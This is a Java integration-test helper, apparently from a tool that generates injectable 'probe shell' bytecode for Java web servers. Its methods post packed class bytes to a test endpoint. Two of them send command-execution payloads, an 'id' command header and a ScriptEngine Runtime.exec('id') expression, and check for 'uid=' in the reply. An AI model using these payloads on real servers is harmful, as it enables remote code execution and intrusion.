package com.reajason.javaweb.integration;

import com.reajason.javaweb.integration.probe.DetectionTool;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.probe.ProbeContent;
import com.reajason.javaweb.probe.ProbeMethod;
import com.reajason.javaweb.probe.ProbeShellGenerator;
import com.reajason.javaweb.probe.ProbeShellResult;
import com.reajason.javaweb.probe.config.ProbeConfig;
import com.reajason.javaweb.probe.config.ResponseBodyConfig;
import lombok.SneakyThrows;
import okhttp3.*;

import static org.hamcrest.CoreMatchers.anyOf;
import static org.hamcrest.CoreMatchers.containsString;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.junit.jupiter.api.Assertions.assertEquals;

/**
 * @author ReaJason
 * @since 2025/8/8
 */
public class ProbeAssertion {

    @SneakyThrows
    public static void responseBytecodeIsOk(String url, String server, int targetJreVersion) {
        ProbeConfig probeConfig = ProbeConfig.builder()
                .probeMethod(ProbeMethod.ResponseBody)
                .probeContent(ProbeContent.Bytecode)
                .targetJreVersion(targetJreVersion)
                .debug(true)
                .shrink(true)
                .staticInitialize(true)
                .build();
        String reqParamName = "payload";
        ResponseBodyConfig responseBodyConfig = ResponseBodyConfig.builder()
                .server(server)
                .reqParamName(reqParamName)
                .build();
        ProbeShellResult probeResult = ProbeShellGenerator.generate(probeConfig, responseBodyConfig);
        RequestBody requestBody = new FormBody.Builder()
                .add("data", Packers.BigInteger.getInstance().pack(probeResult.toClassPackerConfig()))
                .add(reqParamName, DetectionTool.getServerDetection())
                .build();
        Request request = new Request.Builder()
                .header("Content-Type", "application/x-www-form-urlencoded")
                .url(url + "/biginteger").post(requestBody)
                .build();
        try (Response response = new OkHttpClient().newCall(request).execute()) {
            assertEquals(server, response.body().string());
        }
    }

    @SneakyThrows
    public static void responseBytecodeWithoutPrefixIsOk(String url, String server, int targetJreVersion) {
        ProbeConfig probeConfig = ProbeConfig.builder()
                .probeMethod(ProbeMethod.ResponseBody)
                .probeContent(ProbeContent.Bytecode)
                .targetJreVersion(targetJreVersion)
                .debug(true)
                .shrink(true)
                .staticInitialize(true)
                .build();
        String reqParamName = "payload";
        ResponseBodyConfig responseBodyConfig = ResponseBodyConfig.builder()
                .server(server)
                .reqParamName(reqParamName)
                .build();
        ProbeShellResult probeResult = ProbeShellGenerator.generate(probeConfig, responseBodyConfig);
        RequestBody requestBody = new FormBody.Builder()
                .add("data", Packers.BigInteger.getInstance().pack(probeResult.toClassPackerConfig()))
                .add(reqParamName, DetectionTool.getServerDetection().replace("yv66vgAAAD", ""))
                .build();
        Request request = new Request.Builder()
                .header("Content-Type", "application/x-www-form-urlencoded")
                .url(url + "/biginteger").post(requestBody)
                .build();
        try (Response response = new OkHttpClient().newCall(request).execute()) {
            assertEquals(server, response.body().string());
        }
    }

    @SneakyThrows
    public static void responseCommandIsOk(String url, String server, int targetJreVersion) {
        ProbeConfig probeConfig = ProbeConfig.builder()
                .probeMethod(ProbeMethod.ResponseBody)
                .probeContent(ProbeContent.Command)
                .debug(true)
                .shrink(true)
                .staticInitialize(true)
                .targetJreVersion(targetJreVersion)
                .build();
        String headerName = "X-Header-CMD";
        ResponseBodyConfig responseBodyConfig = ResponseBodyConfig.builder()
                .server(server)
                .reqParamName(headerName)
                .build();
        ProbeShellResult probeResult = ProbeShellGenerator.generate(probeConfig, responseBodyConfig);
        RequestBody requestBody = new FormBody.Builder()
                .add("data", Packers.BigInteger.getInstance().pack(probeResult.toClassPackerConfig()))
                .build();
        Request request = new Request.Builder()
                .header("Content-Type", "application/x-www-form-urlencoded")
                .header(headerName, "id")
                .url(url + "/biginteger").post(requestBody)
                .build();
        try (Response response = new OkHttpClient().newCall(request).execute()) {
            assertThat(response.body().string(), anyOf(
                    containsString("uid=")
            ));
        }
    }

    @SneakyThrows
    public static void responseScriptEngineIsOk(String url, String server, int targetJreVersion) {
        ProbeConfig probeConfig = ProbeConfig.builder()
                .probeMethod(ProbeMethod.ResponseBody)
                .probeContent(ProbeContent.ScriptEngine)
                .debug(true)
                .shrink(true)
                .staticInitialize(true)
                .targetJreVersion(targetJreVersion)
                .build();
        String headerName = "X-Header-Script";
        ResponseBodyConfig responseBodyConfig = ResponseBodyConfig.builder()
                .server(server)
                .reqParamName(headerName)
                .build();
        ProbeShellResult probeResult = ProbeShellGenerator.generate(probeConfig, responseBodyConfig);
        RequestBody requestBody = new FormBody.Builder()
                .add("data", Packers.BigInteger.getInstance().pack(probeResult.toClassPackerConfig()))
                .build();
        Request request = new Request.Builder()
                .header("Content-Type", "application/x-www-form-urlencoded")
                .header(headerName, "new java.util.Scanner(java.lang.Runtime.getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()")
                .url(url + "/biginteger").post(requestBody)
                .build();
        try (Response response = new OkHttpClient().newCall(request).execute()) {
            assertThat(response.body().string(), anyOf(
                    containsString("uid=")
            ));
        }
    }
}
